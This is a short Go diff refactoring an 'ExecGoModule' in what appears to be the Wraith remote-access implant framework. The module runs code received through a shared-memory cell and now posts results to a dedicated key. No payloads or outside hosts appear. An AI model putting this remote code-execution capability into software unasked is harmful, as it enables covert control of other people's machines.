@@ -12,17 +12,18 @@ import (
 
 const (
 	ExecGoModule_SHM_EXECUTE = "w.execgo.execute"
+	ExecGoModule_SHM_RESULT  = "w.execgo.result"
 )
 
 type ExecGoModule struct {
 	mutex sync.Mutex
 }
 
-func (m *ExecGoModule) Mainloop(ctx context.Context, w *libwraith.Wraith) error {
+func (m *ExecGoModule) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	// Ensure this instance is only started once and mark as running if so
 	single := m.mutex.TryLock()
 	if !single {
-		return fmt.Errorf("already running")
+		panic(fmt.Errorf("already running"))
 	}
 	defer m.mutex.Unlock()
 
@@ -40,7 +41,7 @@ func (m *ExecGoModule) Mainloop(ctx context.Context, w *libwraith.Wraith) error 
 		select {
 		// Trigger exit when requested
 		case <-ctx.Done():
-			return nil
+			return
 		// Manage w.debug watch
 		case value := <-execCellWatch:
 			// Make sure the value is a string. If not, ignore it.
@@ -77,7 +78,7 @@ func (m *ExecGoModule) Mainloop(ctx context.Context, w *libwraith.Wraith) error 
 			// Execute the function and send the result if one is returned
 			result := fn()
 			if result != nil {
-				w.SHMSet(libwraith.SHM_TX_QUEUE, result)
+				w.SHMSet(ExecGoModule_SHM_RESULT, result)
 			}
 		}
 	}
